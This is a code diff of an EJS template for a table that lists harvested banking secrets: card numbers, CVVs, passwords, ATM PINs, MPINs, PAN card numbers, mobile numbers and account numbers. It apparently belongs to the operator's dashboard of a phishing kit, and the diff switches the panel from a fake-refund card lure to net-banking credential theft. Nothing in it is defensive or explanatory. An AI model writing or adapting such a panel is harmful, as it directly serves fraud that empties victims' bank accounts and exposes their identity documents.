@@ -18,28 +18,32 @@
           <thead>
             <tr>
               <th></th>
-              <th>Account Holder Name</th>
-              <th>Refund Amount</th>
-              <th>Card Holder Name</th>
-              <th>Card Number</th>
-              <th>Expiry Date</th>
-              <th>CVV</th>
-              <th>Login Pin</th>
+              <th>Customer ID</th>
+              <th>Password</th>
+              <th>Debit Card</th>
+              <th>ATM PIN</th>
+              <th>Register Mobile Number</th>
+              <th>MPIN</th>
+              <th>Pan Card</th>
               <th>MPin</th>
+              <th>Register Mobile Number 2</th>
+              <th>Account Number</th>
             </tr>
           </thead>
           <tbody id="data-table-body">
             <% for (let i = 0; i < data.length; i++) { %>
             <tr>
               <td><%= i + 1 %></td>
-              <td><%= data[i].account_holder_name %></td>
-              <td><%= data[i].refund_amount %></td>
-              <td><%= data[i].card_holder_name %></td>
-              <td><%= data[i].card_number %></td>
-              <td><%= data[i].expiry_date %></td>
-              <td><%= data[i].cvv %></td>
-              <td><%= data[i].login_pin %></td>
+              <td><%= data[i].customer_id %></td>
+              <td><%= data[i].password %></td>
+              <td><%= data[i].debit_card %></td>
+              <td><%= data[i].atm_pin %></td>
+              <td><%= data[i].register_mobile_number %></td>
               <td><%= data[i].mpin %></td>
+              <td><%= data[i].pan_card %></td>
+              <td><%= data[i].mpin %></td>
+              <td><%= data[i].register_mobile_number_2 %></td>
+              <td><%= data[i].account_number %></td>
             </tr>
             <% } %>
           </tbody>
